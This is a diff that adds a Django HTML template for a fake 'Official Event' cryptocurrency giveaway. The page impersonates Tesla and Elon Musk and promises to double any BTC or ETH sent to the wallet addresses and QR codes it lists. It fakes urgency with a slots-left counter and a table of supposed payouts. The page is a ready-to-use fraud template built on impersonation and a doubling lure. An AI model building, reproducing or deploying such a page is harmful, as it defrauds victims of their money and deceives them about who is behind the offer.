@@ -1,0 +1,152 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="{% static 'css/home.css' %}">
+    <link rel="shortcut icon" href="{% static 'images/tesla_logo_icon.svg' %}" type="image/x-icon">
+    <link href="{% static 'fontawesome-free-6.4.0-web/css/all.css' %}" rel="stylesheet">
+    <script src="{% static 'scripts/script.js' %}"></script>
+    <title>Biggest CRYPTO giveaway of $100000000</title>
+</head>
+<body>
+    <div id="main">
+        <nav>
+            <img src="{% static 'images/Tesla_logo.png' %}">
+            <div id="links">
+                <a href="#intro">Giveaway</a>
+                <a href="#rules">Info</a>
+                <a href="#instructions">Instruction</a>
+                <a href="#participate">Participate</a>
+                <a href="#transactions">Transactions</a>
+            </div>
+            <a class="p_button" href="#participate">Participate <i class="fas fa-regular fa-arrow-right"></i></a>
+        </nav>
+
+        <header>
+            <div id="intro">
+                <span id="badge"><i class="fa-solid fa-circle-check"></i> Official Event</span>
+                <h1>BIGGEST CRYPTO GIVEAWAY<br>OF <text>$100 000 000</text></h1>
+                <article>
+                    During this unique event we will give you the opportunity to get
+                    <text>1,000 BTC</text> &amp; <text>10,000 ETH</text> &amp; 
+                    <text>100,000,000 DOGE</text> &amp; 
+                    <text>100,000,000 XRP</text>. 
+                    Have a look at the rules and don’t miss on your chance! You can only participate once!
+                </article>
+                <a class="p_button" href="#participate" style="margin-top: 30px;">Participate <i class="fas fa-regular fa-arrow-right"></i></a>
+            </div>
+            <div id="intro_img">
+                <img src="{% static 'images/Elon_Musk.png' %}">
+            </div>
+
+        </header>
+
+        <section id="instructions">
+            <h2>Instruction For Participation</h2>
+            <div id="cards">
+                <div class="card">
+                    <i class="fas fa-regular fa-wallet" style="color: rgb(227, 47, 77); font-size: 60px; margin-bottom: 15%;"></i>
+                    To participate you can do the transaction using any wallet or exchange!
+                </div>
+
+                <div class="card">
+                    <i class="fas fa-regular fa-right-left" style="color: rgb(227, 47, 77); font-size: 60px; margin-bottom: 15%;"></i>
+                    Send the desired number of coins to the special address below.
+                </div>
+
+                <div class="card">
+                    <i class="fa-solid fa-circle-check" style="color: rgb(227, 47, 77); font-size: 60px; margin-bottom: 15%;"></i>
+                    Once we receive your transaction, the doubled amount will be sent back to you immediately.
+                </div>
+
+                <div class="card">
+                    <i class="fas fa-regular fa-gift" style="color: rgb(227, 47, 77); font-size: 60px; margin-bottom: 15%;"></i>
+                    You can only take part in our giveaway once, hurry up!
+                </div>
+            </div>
+        </section>
+
+        <section id="rules">
+            <h2>Rules And Information</h2>
+            <div id="cards">
+                <div class="r_card">
+                    <h2>About Giveaway</h2>
+                    <article>
+                        We believe that BTC & ETH & DOGE & XRP will make the world more fair.
+                        To speed up the process of cryptocurrency mass adoption, 
+                        we decided to run 
+                        <text>1,000 BTC</text> & <text>10,000 ETH</text> & <text>100,000,000 DOGE</text> & <text>100,000,000 XRP</text> 
+                        giveaway for all crypto holders!
+                    </article>
+
+                </div>
+
+                <div class="r_card">
+                    <h2>How To Participate ?</h2>
+                    <article>                    
+                        To participate you just need to send any amount from <text>(0.1 BTC to 50 BTC) </text>
+                        or <text>(1 ETH to 500 ETH)</text> 
+                        or <text>(10,000 DOGE to 5,000,000 DOGE) </text>
+                        or <text>(2,500 XRP to 5,000,000 XRP)</text> to the contribution address, 
+                        and we will immediately send back the double amount <text>(0.2 BTC to 100 BTC) </text>
+                        or <text>(2 ETH to 1,000 ETH)</text> or <text>(20,000 DOGE to 10,000,000 DOGE)</text> 
+                        or <text>(5,000 XRP to 10,000,000 XRP) (x2)</text> to the address you sent it from
+                    </article>
+
+                </div>
+            </div>
+        </section>
+
+        <section>
+            <h2>Slots Left:</h2>
+            {% for slots in slot %}
+            <center><div id="timer">{{ slots.slots }}</div></center>
+            {% endfor %}
+        </section>
+
+        <section id="participate">
+            <h2>Participate In Giveaway</h2>
+            <div id="cards">
+                <div class="r_card">
+                    <div><img src="https://chart.googleapis.com/chart?chs=250x250&cht=qr&chl= bc1qhgd2dajvtrcfkedmnr6lxge4uctw48ac28hl6p"></div>
+                    <h2>Send your BTC to the address for X2 back</h2>
+                    <h3 id="btc_addr">bc1qhgd2dajvtrcfkedmnr6lxge4uctw48ac28hl6p</h3>
+                    <button class="c_button" onclick="copyBTC_ToClipboard()">Copy Address</button>
+                </div>
+
+                <div class="r_card">
+                    <div><img src="https://chart.googleapis.com/chart?chs=250x250&cht=qr&chl= 0xd398aaB627b8cCc103f553d530FC6b7099F686C8"></div>
+                    <h2>Send your ETH to the address for X2 back</h2>
+                    <h3 id="eth_addr">0xd398aaB627b8cCc103f553d530FC6b7099F686C8</h3>
+                    <button class="c_button" onclick="copyETH_ToClipboard()">Copy Address</button>
+                </div>
+            </div>
+        </section>
+
+        <section id="transactions">
+            <h2>Transactions</h2>
+            <table>
+				<tr>
+                    <th>Address</th>
+					<th>Sent</th>
+                    <th>Received</th>
+				</tr>
+                {% for transactions in transaction %}
+				<tr>
+					<td style="width: 50%;">{{ transactions.Address }}...</td>
+					<td>{{ transactions.Deposit }} {{ transactions.Currency }}</td>
+                    <td>{{ transactions.Received }} {{ transactions.Currency}}</td>
+				</tr>
+                {% endfor %}
+			</table>
+        </section>
+
+        <footer>
+            <img src="{% static 'images/Tesla_logo.png' %}">
+            <a class="p_button" href="#participate">Participate <i class="fas fa-regular fa-arrow-right"></i></a>
+        </footer>
+    </div>
+</body>
+</html>
